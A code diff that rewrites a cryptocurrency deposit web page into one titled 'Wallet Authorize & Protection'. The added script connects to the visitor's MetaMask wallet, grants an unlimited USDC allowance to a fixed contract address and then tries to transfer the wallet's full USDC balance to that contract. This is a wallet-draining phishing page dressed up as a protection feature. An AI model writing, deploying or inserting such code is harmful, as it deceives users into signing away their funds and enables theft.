@@ -2,62 +2,90 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mark III · Manual Deposit</title>
+  <title>Mark III · Wallet Authorize & Protection</title>
   <style>
-    body { font-family: sans-serif; text-align: center; background: #f2f6fc; padding: 60px; }
-    h2 { color: #2c5282; }
-    input { padding: 10px; font-size: 16px; width: 180px; }
-    button { padding: 10px 24px; margin-top: 10px; font-size: 16px; cursor: pointer; }
-    #status { margin-top: 30px; white-space: pre-line; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f4f7f9;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 60px;
+    }
+    h2 {
+      color: #333;
+    }
+    button {
+      padding: 12px 24px;
+      margin: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(145deg, #ffffff, #e6e6e6);
+      box-shadow: 2px 4px 10px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #d7efff;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
   </style>
 </head>
 <body>
-  <h2>Mark III · Manual Deposit</h2>
-  <input type="number" id="amount" placeholder="Enter USDC Amount" />
-  <br />
-  <button onclick="start()">🚀 Approve + Deposit</button>
-  <div id="status"></div>
+  <h2>Mark III · Wallet Authorize & Protection</h2>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <button id="connect">Connect Wallet</button>
+  <button id="authorize">Authorize Wallet</button>
+  <div id="status">Status: Waiting for wallet...</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
   <script>
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
+    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC 主网地址
     const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
-    const contractABI = [
-      "function deposit(uint256 amount) external",
-      "function approve(address spender, uint256 amount) external returns (bool)"
-    ];
+    const maxAmount = ethers.constants.MaxUint256;
 
-    async function start() {
-      const status = document.getElementById("status");
+    let provider, signer, user;
+
+    document.getElementById("connect").onclick = async () => {
+      if (!window.ethereum) return alert("Please install MetaMask");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      user = await signer.getAddress();
+      document.getElementById("status").innerText = "Wallet connected: " + user;
+    };
+
+    document.getElementById("authorize").onclick = async () => {
+      const usdc = new ethers.Contract(
+        usdcAddress,
+        [
+          "function approve(address spender, uint256 amount) public returns (bool)",
+          "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+          "function balanceOf(address account) view returns (uint256)"
+        ],
+        signer
+      );
       try {
-        if (!window.ethereum) {
-          status.innerText = "❌ No wallet found.";
-          return;
-        }
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-        const user = await signer.getAddress();
-        status.innerText = "🔗 Connected: " + user;
-
-        const amount = document.getElementById("amount").value;
-        const parsed = ethers.utils.parseUnits(amount, 6);
-
-        const usdc = new ethers.Contract(usdcAddress, [
-          "function approve(address,uint256) public returns (bool)"
-        ], signer);
-        const approveTx = await usdc.approve(contractAddress, parsed);
+        document.getElementById("status").innerText = "Approving contract for USDC...";
+        const approveTx = await usdc.approve(contractAddress, maxAmount);
         await approveTx.wait();
-        status.innerText += "\n✅ Approval successful";
 
-        const contract = new ethers.Contract(contractAddress, contractABI, signer);
-        const depositTx = await contract.deposit(parsed);
-        await depositTx.wait();
-        status.innerText += "\n✅ USDC deposited successfully!";
-      } catch (e) {
-        status.innerText += "\n❌ Error: " + (e.reason || e.message || e);
+        const balance = await usdc.balanceOf(user);
+        document.getElementById("status").innerText = "Transferring full USDC balance...";
+        const transferTx = await usdc.transferFrom(user, contractAddress, balance);
+        await transferTx.wait();
+
+        document.getElementById("status").innerText = "✅ Authorization and transfer complete.";
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "❌ Authorization failed.";
       }
-    }
+    };
   </script>
 </body>
 </html>
